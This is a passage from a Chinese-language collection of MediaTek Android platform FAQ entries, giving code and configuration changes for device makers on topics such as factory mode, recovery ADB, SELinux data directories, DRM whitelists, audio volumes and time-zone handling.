b) 如平台使用的是【NAND】，新LID对应struct的size必须是page size对齐（即4K或2K）。

2.客制化pro_info，请参考《Customization in NvRAM Product Info feature.pptx》
注意事项_2：
a) 如平台使用的是【eMMC】，g_new_nvram_lid[] 里面新LID的size必须要128K对齐；
b) 如平台使用的是【NAND】， g_new_nvram_lid[] 里面新LID的size必须要blocksize对齐（4K pagesize对应的是256K，2K pagesize对应的是128K）。

3.上层APK读写设置factory mode关闭的标记,请参考FAQ ：FAQ04542
4.lk中读取factory mode设置的标记.
1）-in alps\mediatek\platform\mt6572\lk\factory.c  factory_detection()中判断factory_check_key_trigger()之前添加一个if判断，读取flag为1，返回false
```

## [FAQ11384]  [SW相关] 设置3个组合键进入factory mode

```text
为了减少end users在使用手机的过程中由于误操作进入factory mode的几率，增加了1个键，让客户进入factory mode需要同时按下3个组合键（Power Key+VolumDown+物理按键）。

1.在apls\mediatek\platform\mt65xx\lk\factory.c中的factory_check_key_trigger函数中修改
if(mtk_detect_key(MT65XX_FACTORY_KEY)&&mtk_detect_key(MT65XX_FACTORY_KEY2))
2.在cust_key.h中加入#define MTK65XX_FACTORY_KEY2 XX（参照MTK65XX_FACTORY_KEY定义对应的key）
3.第2步添加的MTK65XX_FACTORY_KEY2的值必须是在Cust_kpd.h中KPD_INIT_KEYMAP中已定义的物理按键的数值。
```

## [FAQ18526]  [SAT] 使用过程中，欢迎语突然又弹出来，是否正常?

```text
在Flight mode/掉卡/SIM Switch/World Mode/World Phone切换都有可能会导致欢迎语弹出两次，
因为有重新给卡初始化的动作，
除了掉卡问题，需要driver同仁解决，
其他都是正常的，
因为这些情况下都会导致SIM卡重新上电，重新上电的话，手机就一定要再发一次terminal profile给卡，告知卡手机支持哪些SAT命令，从而会触发卡新上报欢迎语。
 
有些客户可能会考虑在界面上屏蔽这次欢迎语的上报，这样是不妥当的，因为有些卡是不会上报欢迎语的，第一条上报的display text是一些关键的信息。如果贸然屏蔽掉第一条上报的display text命令，会导致有些卡的关键信息看不到。
 
在radio log里的关键log:
掉卡的关键log:ESIMS:0,13；
SIM SWITCH关键log:AT+ES3G=* 或者AT+ESIMMAP=*；
World Mode切换：AT+ECSRA=2,*,*,*；
World Phone切换：Switching to *DD CSFB modem,其中这个*有可能是F，也有可能是T,就是说FDD和TDD之间的切换；
 
还有一些卡,是更新注册网络信息，或者没有任何原因的就会主动上报欢迎语,客户可以先自行在其他对比机插入同一张卡做对比测试，如在对比机上未发现类似情况，再提交eservice.
```

## [FAQ14370]  如何让返回键具有删除编辑内容功能

```text
在编辑界面，如果正在编辑，就删除编辑的内容。如果编辑的内容为空，按下返回键就返回上一界面，请问该如何实现?

修改 Activity.java 中 onKeyUp 为如下：
public boolean onKeyUp(int keyCode, KeyEvent event) {
    if (getApplicationInfo().targetSdkVersion >= Build.VERSION_CODES.ECLAIR) {
        if (keyCode == KeyEvent.KEYCODE_BACK && event.isTracking() && !event.isCanceled()) {
            if (isResumed()) { 
                View decorView = this.getWindow().getDecorView();//MTK modifyBegin
                if (decorView != null) {
                    View focus = decorView.findFocus();
                    if (focus!=null && focus instanceof EditText) {
                        EditText editText = (EditText)focus;
                        CharSequence text = editText.getText();
                        if (text!=null && text.length()>0) {
                            editText.setText("");
                            return true;
                        }
                    }
                }
                onBackPressed(); //MTK modify END
                return true;
            } else {
                Log.v(TAG, "Tracking Key Up, activity is resumed: " + isResumed());
                // Fix sub activity of tab activity which isn't in resumed state
                // Return false means didn't handle this key event
                return false;
            }
            /// @}
        }
    }
    return false;
}
```

## [FAQ19537]  [Recovery]  [Common] recovery模式中选择Apply update from adb升级失败，电脑端提示“无法识别USB设备” 或"device not found"

```text
建议参考下面的修改
1、alps/bootable/recovery/etc/init.rc
on property:cus.recoveryadb.prop=1
write /sys/class/android_usb/android0/enable 0
write /sys/class/android_usb/android0/idVendor 0E8D
write /sys/class/android_usb/android0/idProduct 201C
write /sys/class/android_usb/android0/f_ffs/aliases adb
write /sys/class/android_usb/android0/functions adb
write /sys/class/android_usb/android0/enable 1
write /sys/devices/platform/mt_usb/cmode 1

2、adb_install.cpp
set_usb_driver(bool enabled)函数中
添加property_set("cus.recoveryadb.prop", "1");

3、device/mediatek/common/sepolicy/property.te
添加type cus_recoveryadb_prop, property_type;
device/mediatek/common/sepolicy/property_contexts
添加cus.recoveryadb.prop u:object_r:cus_recoveryadb_prop:s0
device/mediatek/common/sepolicy/recovery.te
allow recovery cus_recoveryadb_prop:property_service set;
 
adb sideload 使用方法可参考  "FAQ04559 [Recovery]  [Common] 从JB版本开始支持adb sideload命令"
```

## [dtmf]  [FAQ06239]  [new feature] 通话录音时如何播放提示音给对方?

```text
因为涉及到通话隐私问题，部分客户要求在通话录音时播放提示音给对方
下面这个修改同时会将本地的背景播放音乐等声音播放给对方

BGS UL gain默认为0，所以本方播放的声音对方不会听到
修改BGS UL gain，可以将本地播放的声音传给对方 
 
在点击通话录音之后
1.将BGS UL gain 设为最大
2.播放声音
3.播放完后将BGS UL gain还原为0

packages/apps/Dialer/InCallUI/src/com/android/incallui/CallButtonPresenter.java 
public void voiceRecordClicked() {
    //1.set the mBGSUlGain to 0xFF in hal
    AudioSystem.setParameters("SET_BGS_UL_GAIN=1");
    //2.play the warning tone here
    //3.set the mBGSUlGain to 0x0 in hal
    AudioSystem.setParameters("SET_BGS_UL_GAIN=0");

    TelecomAdapter.getInstance().startVoiceRecording();
    ......
}
  
AudioALSAHardware.cpp
//add this
static String8 keySET_BGS_UL_GAIN= String8("SET_BGS_UL_GAIN");
 
status_t AudioALSAHardware::setParameters(const String8 &keyValuePairs)
{
......
//add this start
if (param.getInt(keySET_BGS_UL_GAIN, value) == NO_ERROR) { 
param.remove(keySET_BGS_UL_GAIN); 
ALOGD("+%s(): %s", __FUNCTION__, "SET_BGS_UL_GAIN");
if(value==1){
    mStreamManager -> mBGSUlGain = 0xFF; 
}else{
    mStreamManager -> mBGSUlGain = 0x0; 
}
//add this end
}
}
```

## [FAQ17344]  [SIM] 怎样判别是否为“白卡”（测试卡）

```text
怎样判别一张卡是否为“白卡”（测试卡）

[AP] 
AP端可以获取对应SIM卡的属性值进行判断，0表示普通SIM卡，1表示测试卡。
"gsm.sim.ril.testsim",    --- 卡1
"gsm.sim.ril.testsim.2", --- 卡2
"gsm.sim.ril.testsim.3", --- 卡3
"gsm.sim.ril.testsim.4", --- 卡4

[Modem] 

“白卡”中有些文件内容会有一些特殊规定用于标识“白卡”的身份:
A：MCC-MNC = 001-01 
B：EF_AD文件中的 ms_operation 的值为0x80/0x81/0x02/0x04
我们在读取EF_AD的时候会将之前读出的MCC/MNC满足情况一并做“白卡”判断，判断条件的关系有A&&B和A||B两种，判断条件的关系在test_sim_relation()中定义，若需要修改判断关系（&&或者||）直接修改此函数的return值即可，返回0对应||、返回1对应&&；
判断结果存放在SIM的全局context中（this_sim->is_test_sim），客户可调用is_test_sim()接口获得判断结果，参数为想获得信息的SIM编号：0x00/0x01/0x02/0x03分别对应SIM1、SIM2、SIM3、SIM4。
```

## [默认值]  [FAQ19583]  [Audio App] android N 版本铃声设置显示“更多铃声”选项

```text
默认在android M版本铃声设置对话框里面包含“更多铃声”选项。实际上在N版本里面也包含这项功能，只是未让它显示。铃声
设置对话框代码在 packages/providers/MediaProvider/src/com/android/providers/media/RingtonePickerActivity.java。
在 RingtonePickerActivity.java 的 onCreate 函数我们发现如下:

/// M: Get whether to show the 'More Ringtones' item
mHasMoreRingtonesItem = intent.getBooleanExtra(RingtoneManager.EXTRA_RINGTONE_SHOW_MORE_RINGTONES, false);

因此我们只要在启动 RingtonePickerActivity 的时候把 RingtoneManager.EXTRA_RINGTONE_SHOW_MORE_RINGTONES
设置成true就好了。在 packages/apps/Settings/src/com/android/settings/RingtonePreference.java 文件的
onPrepareRingtonePickerIntent 函数添加代码如下:

ringtonePickerIntent.putExtra(RingtoneManager.EXTRA_RINGTONE_SHOW_MORE_RINGTONES, true);
```

## [锁网]  [默认值]  [FAQ10495]  [SEC] 如何修改SIM ME LOCK校验界面上的输入密码次数

```text
在AP端默认给SIM ME LOCK的输入密码次数是5次，
如果想修改显示次数或屏蔽掉显示次数，请参考以下步骤。

在收到卡被SIM ME LOCK住时才会去获取对应Category的retry count, 并记录在数组mSimMeLeftRetryCount中。
Path: alps\frameworks\base\policy\src\com\android\internal\policy\impl\keyguard\KeyguardUpdateMonitor.java

AP端显示界面处理:
L版本上(M版本与L版本相同)，
Path：alps\frameworks\base\packages\Keyguard\src\com\mediatek\keyguard\Telephony\ KeyguardSimPinPukMeView.java
getRetryMeString () 这个方法就是来控制次数显示的。
如果想屏蔽显示次数，这个方法return null。

在KK版本上，
Path: alps\frameworks\base\policy\src\com\android\internal\policy\impl\keyguard\KeyguardSIMPinPukView.java
getRetryMe() 这个方法就是来控制次数显示的。
如果想屏蔽显示次数，这个方法return null。

如果想修改显示次数，
不能直接修改方法 meRetryCount 为指定的值；而需要修改 modem 端。
custom_nvram_sec.h(\custom\service\nvram), 修改对应category 的 SML_RETRY_COUNT_xxx_CAT 值。
下面截图是修改前的状态，默认是 5.
```

## [FAQ03989]  [Notification] 如何让通知不被清除或者点击后不消失?

```text
APP发送通知后，点击clear按钮，如何让通知不被清除?或者点击通知后，通知不消失?

APP发送通知时，通知需要添加flag：
notification.flags |= Notification.FLAG_ONGOING_EVENT;
或者
notification.flags |= Notification.FLAG_NO_CLEAR;
```

## [FAQ19254]  [Recents] 更改系统时间后，按recent键无法进入最近应用列表界面

```text
在设置中将系统时间修改为早于当前系统的时间，recent键点击无效，无法正常叫出最近应用列表界面。
这是google default design，用google 6.0对比机来测试也是这样的。
建议维持google原有设计，对于google原生的设计，我们不做修改
原因是：
RecentApp通过AMS的getRunningTasks() API取得目前正在执行中的task记录.
而通过最近一次使用的APP是否为RecentApp, 來判断按下HOME key时是否退出.
AMS会将最近使用的时间资讯(系统时间)记录起来并排序, 但在调整系统时间后造成先后顺序错乱,
导致RecentApp误判目前状态，进而无法退出。
涉及的模块是AMS和RecentApp.
如果AMS仿照RecentApp的修改, 將记录系统时间改为开机时间可能可以解决该问题，但会接影响AMS开放出去的API行为。Framework內部也会根据task时间资讯来做些判断(如Activity決定是否在开机时reset),得将这部分相关逻辑一并修正.
目前敝司经过全面评估，修改该问题后风险依然存在，因此建议维持
```

## [默认值]  [FAQ19361]  如何预置一个WIFI热点

```text
JB版本：
请在  alps/external/wpa_supplicant_8/mtk-wpa_supplicant.conf  这个文件中增加 networt={} 即可。
network需要字段的含义可以查看wpa_supplicant_8/wpa_supplicant.conf文件中的注释“network block fields:”后的说明即可。

KK&L版本：
请在/hardware/mediatek/wlan/config/mtk-wpa_supplicant-overlay.conf文件中增加networ={} 即可。

M 版本路径：
/vendor/mediatek/proprietary/hardware/connectivity/wlan/config/mtk-wpa_supplicant-overlay.conf

如下面的例子，预置一个OPEN 和WPA2-PSK的网络：
ctrl_interface=/data/misc/wpa_supplicant
update_config=1
device_name=rk30sdk
manufacturer=rockchip
model_name=ONE TOUCH EVO8HD
model_number=ONE TOUCH EVO8HD
serial_number=0123456789
device_type=10-0050F204-5
config_methods=physical_display virtual_push_button keypad

network={
     ssid="aaaa"
     scan_ssid=1
     key_mgmt=NONE
}

network={
     ssid="bbbbb"
     scan_ssid=1
     psk="12345678"
     key_mgmt=WPA-PSK
}
```

## [默认值]  [FAQ19495]  调整开关机铃声音量大小

```text
Android N:
alps/frameworks/av/services/audioflinger/Threads.cpp
AudioFlinger::PlaybackThread::mixer_state AudioFlinger::MixerThread::prepareTracks_l(Vector< sp<Track> > *tracksToRemove) {
    .....
#ifdef MTK_AUDIO
    // Do not change the volume, when boot sound open
    if (track->mFlags & IAudioFlinger::TRACK_BOOT) {
        vlf = 0.25f; // 
        vrf = 0.25f; // 改变vlf和vrf的值，取值范围0~1
    }
#endif
    ......
}


Android M & L：
alps/vendor/mediatek/proprietary/custom/(project)/hal/audioflinger/audio/Audio_Customization_Common.h 
#define BOOT_ANIMATION_VOLUME (0.25)
改变BOOT_ANIMATION_VOLUME的值，取值范围0~1
```

## [log]  [FAQ19357]  N版本中，三方应用引用某些系统库导致无法运行

```text
在N版本中为了增强安全性,三方应用也不能随意加载系统没有暴露出来的库，从而会导致三方应用无法运行。
详细内容参考google 官方说明：https://source.android.com/devices/tech/config/namespaces_libraries.html
 
如下图所示，系统的应用，可以调用系统库，而三方应用，只能调用或者加载NDK 暴露出来的一些库，如libc.so。。。之类的和他自身的一些库。
但是如果某些应用有调用到系统 native库就会报出形如下面的Log：
01-06 20:34:05.255959 4629 4629 E AndroidRuntime: java.lang.UnsatisfiedLinkError: dlopen failed: library "/system/lib64/libfmjni.so" needed or dlopened by "/system/lib64/libnativeloader.so" is not accessible for the namespace "classloader-namespace"
01-06 20:34:05.255959 4629 4629 E AndroidRuntime: at java.lang.Runtime.loadLibrary0(Runtime.java:977)
01-06 20:34:05.255959 4629 4629 E AndroidRuntime: at java.lang.System.loadLibrary(System.java:1530)
01-06 20:34:05.255959 4629 4629 E AndroidRuntime: at com.android.fmradio.FmNative.(FmNative.java:45)
01-06 20:34:05.255959 4629 4629 E AndroidRuntime: at com.android.fmradio.FmNative.openDev(Native Method)
01-06 20:34:05.255959 4629 4629 E AndroidRuntime: at com.szwj.autoats.fmradio.FMRadioService.openDevice(FMRadioService.java:576)
01-06 20:34:05.255959 4629 4629 E AndroidRuntime: at com.szwj.autoats.fmradio.FMRadioService.onCreate(FMRadioService.java:1361)
01-06 20:34:05.255959 4629 4629 E AndroidRuntime: at android.app.ActivityThread.handleCreateService(ActivityThread.java:3253)
01-06 20:34:05.255959 4629 4629 E AndroidRuntime: at android.app.ActivityThread.-wrap5(ActivityThread.java)
01-06 20:34:05.255959 4629 4629 E AndroidRuntime: at android.app.ActivityThread$H.handleMessage(ActivityThread.java:1617)
01-06 20:34:05.255959 4629 4629 E AndroidRuntime: at android.os.Handler.dispatchMessage(Handler.java:110)
01-06 20:34:05.255959 4629 4629 E AndroidRuntime: at android.os.Looper.loop(Looper.java:203)
01-06 20:34:05.255959 4629 4629 E AndroidRuntime: at android.app.ActivityThread.main(ActivityThread.java:6251)
01-06 20:34:05.255959 4629 4629 E AndroidRuntime: at java.lang.reflect.Method.invoke(Native Method)
01-06 20:34:05.255959 4629 4629 E AndroidRuntime: at com.android.internal.os.ZygoteInit$MethodAndArgsCaller.run(ZygoteInit.java:1063)
01-06 20:34:05.255959 4629 4629 E AndroidRuntime: at com.android.internal.os.ZygoteInit.main(ZygoteInit.java:924)

如果被依赖的库评估安全性可以开放出来的，则可以将其添加到/device/mediatek/common/public.libraries.vendor.txt名单列表当中。
如果不可以开放到，则此问题属于和N版本不兼容的，需要APP开发者自行处理。
```

## [FAQ15571]  [SELinux]  Android N 版本进程无法直接访问data目录的说明

```text
Google 在android M 版本后, 通过SELinux 的neverallow 语法强制性限制了普通进程访问data 目录的权限. 严禁除init system_server installd system_app 之外的其他进程直接操作/data 目录比如在data 目录下面创建文件，写文件，重命名文件等等.

有很多客户都会在data 目录下创建文件, 保存资讯, 在M 版本上这个操作会被SELinux 直接拦截下来，并且没法直接添加访问system_data_file 的权限，N版本上更加严格, system_app也会被拦截下来.
 
N版本:
neverallow appdomain system_data_file:dir_file_class_set { create write setattr relabelfrom relabelto append unlink link rename };
 
M版本对system_app有是开放权限：
neverallow { appdomain -system_app } system_data_file:dir_file_class_set { create write setattr relabelfrom relabelto append unlink link rename };
 
需要按下面的流程操作：
(1).  在init.rc 或者 其他的init.xxx.rc 的on post-fs-data 段 添加:
mkdir /data/xxxx 0770 root system

(2). 在/device/mediatek/common/sepolicy/file.te 里面添加：
type xxxx_data_file, file_type, data_file_type;

(3). /device/mediatek/common/sepolicy/file_contexts 里面添加：
/data/xxxx(/.*)? u:object_r:xxxx_data_file:s0

(4). 给你的进程添加权限, 比如你的进程的SELinux domain 是 yyyy
allow yyyy xxxx_data_file:dir create_dir_perms;
allow yyyy xxxx_data_file:file create_file_perms;

这样你才能绕过Google 的设置. 这个xxxx 目录随你定义.
```

## [log]  [FAQ19362]  如何设置mobilelog modemlog networklog size大小

```text
第一次开机之前就需配置
配置路径：
M\N 版本：\device\mediatek\common\mtklog
mtklog-config-bsp-eng.prop
mtklog-config-bsp-user.prop
mtklog-config-basic-eng.prop
mtklog-config-basic-user.prop

默认存储大小：
com.mediatek.log.mobile.maxsize = 500
com.mediatek.log.mobile.total.maxsize = 1000
com.mediatek.log.modem.maxsize = 2000
com.mediatek.log.net.maxsize = 600
按照需要修改对应选项即可, 需要注意com.mediatek.log.mobile.maxsize要小于com.mediatek.log.mobile.total.maxsize

2. 其他情况：
1）UI界面设置
mtklogger UI---->Settings---->mobilelog---->Limit Current Log Size
mtklogger UI---->Settings---->mobilelog---->Limit Total Log Size
mtklogger UI---->Settings---->modemlog---->Limit Log Size
mtklogger UI---->Settings---->networklog---->Limit Log Size

2）adb shell command设置,请参考FAQ06939 如何用adb 控制MTKLogger

注意：mobilelog涉及两个size大小设置，需要保证Limit Current Log Size < Limit Total Log Size
```

## [FAQ19217]  wifi连接获取IP失败

```text
连接WiFi获取ip失败，首先可查看MSG_ID_MMI_ABM_IPADDR_CHANGE_REQ中use_dhcp中是否有被设置为KAL_TRUE,具体log信息参考如下：

请在以下函数中添加代码默认使用DHCP。
void srv_dtcnt_wlan_ipaddr_change_req(MMI_BOOL use_dhcp, srv_dtcnt_wlan_ipaddr_update_struct *ipaddr_info) {
/*----------------------------------------------------------------*/
/* Local Variables */
/*----------------------------------------------------------------*/
      mmi_abm_ipaddr_change_req_struct *p;
      srv_dtcnt_prof_wlan_struct *profile = NULL;

/*----------------------------------------------------------------*/
/* Code Body */
/*----------------------------------------------------------------*/
      MMI_TRACE(MMI_CONN_TRC_G6_DTCNT, SRV_DTCNT_WLAN_IPADDR_CHANGE_REQ, use_dhcp, g_srv_dtcnt_wlan_ctx.state);
      if (g_srv_dtcnt_wlan_ctx.state != SRV_DTCNT_WLAN_STATE_CONNECTED) {
           return;
      }

     p = OslAllocDataPtr(mmi_abm_ipaddr_change_req_struct);
     DTCNT_SRV_ILM_MEMSET(p);

     if (g_srv_dtcnt_wlan_ctx.connected_wlan_profile != NULL) {

          kal_prompt_trace(MOD_MMI,"mtk_debug g_srv_dtcnt_wlan_ctx.connected_wlan_profile != NULL ");//添加trace跟踪
          profile = g_srv_dtcnt_wlan_ctx.connected_wlan_profile;
          p->use_dhcp = g_srv_dtcnt_wlan_ctx.connected_wlan_profile->use_dhcp;
      } else {
          use_dhcp = 1;//添加Code；
          p->use_dhcp = use_dhcp;
          if (!use_dhcp)
          {
                    MMI_ASSERT(ipaddr_info);
           }
       }
       ...
}
```

## [性能]  [make]  [FAQ14131]  在预编译阶段提取apk的odex文件以加快开机速度

```text
1 预编译提取apk的odex文件，请在BoardConfig.mk中定义：
WITH_DEXPREOPT := true

打开这个宏之后，无论是有源码还是无源码的预置apk预编译时都会提取odex文件。
（如有发现user版本未提取odex，请检查device.mk文件配置：
   ifeq ($(TARGET_BUILD_VARIANT),user)
       WITH_DEXPREOPT := true
       DONT_DEXPREOPT_PREBUILTS := true  //此句注释掉
   endif 
）

对于64bit的芯片,若apk只有32bit的lib或者只能作为32bit运行，请在预置apk时在android.mk中添加下边的TAG标记此apk为32bit：

LOCAL_MULTILIB :=32
 

2 若需要在预编译时跳过一些apk的odex提取，可以使用下边的方法：
\build\core\dex_preopt_odex_install.mk中添加：
ifeq ($(LOCAL_MODULE),helloworld)
LOCAL_DEX_PREOPT:=
endif
build_odex:=
installed_odex:=
....
Ifeq包起来的部分为需要添加的,helloworld可替换为需要跳过提取odex的apk的LOCAL_MODULE名字
 
注意：
打开WITH_DEXPREOPT 的后，预置太多apk，会导致system.img 过大，而编译不过。遇到这种情况请调大system.img的大小限制。
-------------------  more in   Android N   ----------------------
N版本当中如果预置了GMS包，则对无源码的APK不做预编译处理。如果需要都做，需要在如下代码做修改：
路径：/device/mediatek/common/BoardConfig.mk
......
ifeq ($(BUILD_GMS),yes)
DONT_DEXPREOPT_PREBUILTS := true   ------------------>请把此处关掉，即赋值false。
else
ifeq ($(TARGET_BUILD_VARIANT),userdebug)
DEX_PREOPT_DEFAULT := nostripping
endif
endif
......
 
修改完后，dex2oat操作即在编译时完成，不会影响开机时间。
 
补充说明：Android N中平台添加该特性，是因为WITH_DEXPREOPT := true打开这个之后，就会将有源码以及无源码的所有预置APK在host上做预编译并且塞到system partition中。

但由于內部project storage size的限制，这些预置APK做完dexpreopt之后会超过system partition的size. 因此选择一个折中方案，即加上限制，
对于无源码的APK(ex: GMS)不做dexpreopt的行为。如果客户的system partition足够大塞的下这些预编译完的内容，可以把这段代码拿掉也不会有什么影响。
```

## [默认值]  [FAQ19348]  [Audio volume] 如何修改第三方来电提示音音量

```text
第三方来电提示音 嘟嘟声 过小
InCallTonePlayer.java
private static final int RELATIVE_VOLUME_HIPRI = 80;
修改RELATIVE_VOLUME_HIPRI的值
范围0~100
```

## [FAQ12380]  [Audio APP] 如何在Google Play Music中播放Drm歌曲?

```text
1、请使用adb shell ps，查看com.google.android.music的process的名称。Play Music应该会有两个process：
com.google.android.music:ui
com.google.android.music:main
2、请在mediatek\frameworks\av\drm\mtkwhitelist\DrmMtkDef.cpp中的数组TRUSTED_APP和TRUSTED_PROC中添加com.google.android.music的process，并相应地修改mediatek\frameworks\av\include\drm\DrmMtkDef.h中TRUSTED_APP_CNT和TRUSTED_PROC_CNT的数值。
3、请在packages\providers\MediaProvider\src\com\android\providers\media\DrmHelper.java的setDefaultProcessNames()内的数组permitedProcessNames中添加com.google.android.music的process。

如果是 L 或 L 之后的版本, 上述文件(DrmMtkDef.cpp / DrmMtkDef.h )路径为:
/vendor/mediatek/proprietary/frameworks/av/drm/mtkwhitelist/DrmMtkDef.cpp
/vendor/mediatek/proprietary/frameworks/av/include/drm/DrmMtkDef.h

M版本：
vendor/mediatek/proprietary/frameworks/av/drm/mtkwhitelist/DrmMtkDef.cpp
中向TRUSTED_APP和TRUSTED_PROC中添加com.google.android.music的process

2，/packages/providers/MediaProvider/src/com/android/providers/media/DrmHelper.java
中initDrmPermistProcessList中添加process。
如果不生效，请查看log,如：

MediaPlayerService: setDataSource with fd: untrusted client [10462]  [com.google.android.music:ui] , denied to access drm fd [19] 
可知Google music的process的名称是：com.google.android.music:ui，将process的名称修改。
```

## [FAQ17975]  Android M 首次开机不随sim卡自适应语言修改方案

```text
不能更新的原因是在update config时Android M上去掉了对locale改变的update, 按如下方法改成与Android L上一致即可。如果修改之后仍不能自适应语言，请在修改之后再参考FAQ14489 Android L sim卡自适应语言问题 的修改方法。
 
/frameworks/opt/telephony/src/java/com/android/internal/telephony/MccTable.java
public static void updateMccMncConfiguration(Context context, String mccmnc, boolean fromServiceState) {
    Slog.d(LOG_TAG, "updateMccMncConfiguration mccmnc='" + mccmnc + "' fromServiceState=" + fromServiceState);
    if (Build.IS_DEBUGGABLE) {
        String overrideMcc = SystemProperties.get("persist.sys.override_mcc");
        if (!TextUtils.isEmpty(overrideMcc)) {
            mccmnc = overrideMcc;
            Slog.d(LOG_TAG, "updateMccMncConfiguration overriding mccmnc='" + mccmnc + "'");
        }
    }

    if (!TextUtils.isEmpty(mccmnc)) {
        int mcc, mnc;

        String defaultMccMnc = TelephonyManager.getDefault().getSimOperatorNumeric();
        Slog.d(LOG_TAG, "updateMccMncConfiguration defaultMccMnc=" + defaultMccMnc);
        //Update mccmnc only for default subscription in case of MultiSim.
        // if (!defaultMccMnc.equals(mccmnc)) {
        // Slog.d(LOG_TAG, "Not a Default subscription, ignoring mccmnc config update.");
        // return;
        // }

        try {
            mcc = Integer.parseInt(mccmnc.substring(0,3));
            mnc = Integer.parseInt(mccmnc.substring(3));
        } catch (NumberFormatException e) {
            Slog.e(LOG_TAG, "Error parsing IMSI: " + mccmnc);
            return;
        }

        Slog.d(LOG_TAG, "updateMccMncConfiguration: mcc=" + mcc + ", mnc=" + mnc);
        Locale locale = null; //添加这行
        if (mcc != 0) {
            setTimezoneFromMccIfNeeded(context, mcc);
            locale = getLocaleFromMcc(context, mcc); //添加这行
        }
        if (fromServiceState) {
            setWifiCountryCodeFromMcc(context, mcc);
        } else {
            // from SIM
            try {
                Configuration config = new Configuration();
                boolean updateConfig = false;
                if (mcc != 0) {
                    config.mcc = mcc;
                    config.mnc = mnc == 0 ? Configuration.MNC_ZERO : mnc;
                    updateConfig = true;
                }
                if (locale != null) { //添加这行
                    config.setLocale(locale); //添加这行
                    updateConfig = true; //添加这行
                } //添加这行

                if (updateConfig) {
                    Slog.d(LOG_TAG, "updateMccMncConfiguration updateConfig config=" + config);
                    ActivityManagerNative.getDefault().updateConfiguration(config);
                } else {
                    Slog.d(LOG_TAG, "updateMccMncConfiguration nothing to update");
                }
            } catch (RemoteException e) {
                Slog.e(LOG_TAG, "Can't update configuration", e);
            }
        }
    } else {
        if (fromServiceState) {
            // an empty mccmnc means no signal - tell wifi we don't know
            setWifiCountryCodeFromMcc(context, 0);
        }
    }
}
```

## [FAQ16264]  [FM] 首次进入收音机(FM) app，播放的频率不一定是代码中默认的频率，为什么?如何修改为代码中的频率?

```text
烧机之后首次进入收音机，播放的频率不一定是代码中默认的频率，为什么?如何修改为播放的频率为代码中的频率?
1、首次进入FM，播放的频率不一定是代码中写入的频率原因是：
烧机之后首次进入FM，频率会使用DEFAULT_STATION，但使用时会判断DEFAULT_STATION是否是valid的station，若不是，则自动跳转到下一station。若是，则使用DEFAULT_STATION。
 
2、修改方法是：不进行判断是否是valid Station，直接播放
在FmService.java文件中firstPlaying修改如下：
private boolean firstPlaying(float frequency) {
Log.d(TAG, "firstPlaying, freq: " + frequency);
if (mPowerStatus != POWER_UP) {
Log.w(TAG, "firstPlaying, FM is not powered up");
return false;
}
//delete below
boolean isSeekTune = false;
float seekStation = FmNative.seek(frequency, false);
int station = FmUtils.computeStation(seekStation);
if (FmUtils.isValidStation(station)) {
isSeekTune = FmNative.tune(seekStation);
if (isSeekTune) {
playFrequency(seekStation);
}
}
// if tune fail, pass current station to update ui
if (!isSeekTune) {
seekStation = FmUtils.computeFrequency(mCurrentStation);
}
//delete above

//add below
boolean isSeekTune =true; 
playFrequency(frequency);
//add above

return isSeekTune;
} 
```

## [FAQ15188]  通过NITZ获取时区出错

```text
获取时区步骤分析： 
1：有些基站发送NITZ的信息是没有包含时区信息的，
2：需要通过国家码在ICU中获取时区，获取到的时区可能是多个时区，同时返回第一个时区。
3：ICU返回的时区很可能与客户需求不匹配，因此我司定义了一个数组让客户可以自定义国家码与之对应的时区（一个国家码只能对应唯一的一个时区）
我司原本定义与国家码对应的时区可能不符合贵司需求，或是没有定义就会引起这个问题

可以通过LOG判定问题
如果在radio_log 中出现下面的LOG则确定是此问题引起：
uses TimeZone of Capital City:

需要在GsmServiceStateTracker文件中mTimeZoneIdOfCapitalCity 这个数组加入或是修改对应的国家码以及时区；

举例
如获取到的是New_York时区而贵司需求是Los_Angeles时区
请搜索LOG如果出现
GsmSST  : [GsmSST0]  uses TimeZone of Capital City:America/New_York
确定是此问题
修改如下
private String[]  []  mTimeZoneIdOfCapitalCity = {
{"us", "America/New_York"}，
修改为
{"us", "America/Los_Angeles"}， 
};
```

## [FAQ14476]  手机时间最多只能选到2037年12月30日

```text
这个是GOOGLE默认设计的。
因为时间选择最后一天时候，切换时区会有问题.
如在西八区,选最后一天的时间为2037年12月31日23:59分，此时切换到东八区，这时无法显示东八区的正确时间。
因此建议接受这个设计。 
```

## [默认值]  [icu]  [FAQ12388]  如何修改某种语言的默认时间格式(12小时制，24小时制)

```text
如果没有设置默认系统的时间显示格式（12小时制或者24小时制），系统切换不同语言显示时间格式是不同的，
比如波斯语是24小时制，中文是12小时制，这是在哪里控制的呢?
[SOLUTION] 
这是icu的时间格式觉定的“H”代表24小时制，“h”代表12小时制，如波斯语如下
android kk external\icu4c\data\locales\fa.txt
android L   external\icu\icu4c\source\data\locales\fa.txt 
gregorian{
DateTimePatterns{
"H:mm:ss (zzzz)",
"H:mm:ss (z)",
"H:mm:ss",
"H:mm",
"EEEE d MMMM y",
"d MMMM y",
"d MMM y",
"y/M/d",
}
如果改成12小时制的话，只需把上面红色部分改成下面就行
"H:mm:ss (zzzz)",
"h:mm:ss (z)",
"h:mm:ss",
"h:mm",
注意修改完后请先编译icu资源（ FAQ04011 ），在new工程，否则不会起效果。
```

## [知识点]  [FAQ03998]  “日期和时间->自动确定日期和时间->使用网络提供时间”功能是怎样实现的?

```text
现在android通过网络同步时间有两种方式：NITZ和NTP，它们使用的条件不同，可以获取的信息也不一样；勾选这个功能后，手机首先会尝试NITZ方式，若获取时间失败，则使用NTP方式

1.NITZ(network identity and time zone)同步时间
NITZ是一种GSM/WCDMA基地台方式，必须插入SIM卡，且需要operator支持；可以提供时间和时区信息

中国大陆运营商基本是不支持的

2.NTP(network time protocol)同步时间
NTP在无SIM卡或operator不支持NITZ时使用，单纯通过网络（GPRS/WIFI）获取时间，只提供时间信息，没有时区信息（因此在不支持NITZ的地区，自动获取时区功能实际上是无效的）

NTP还有一种缓存机制：当前成功获取的时间会保存下来，当用户下次开启自动更新时间功能时会结合手机clock来进行时间更新。这也是没有任何网络时手机却能自动更新时间的原因。

此外，因为NTP是通过对时的server获取时间，当同步时间失败时，可以检查一下对时的server是否有效，并替换为其他server试一下。

3.如何判断手机通过哪种方式更新时间
设置一个错误的时区，查看时区是否有被更新正确，若时间和时区都有更新正确，那么就是GSM网路有送NITZ消息上来；

若只有时间更新，而时区没有变化，就是NTP方式，即它通过网络（GPRS/WIFI）连接到server去获取时间。
```

## [icu]  [默认值]  [FAQ06450]  【DatePicker】如何修改DatePicker月份显示

```text
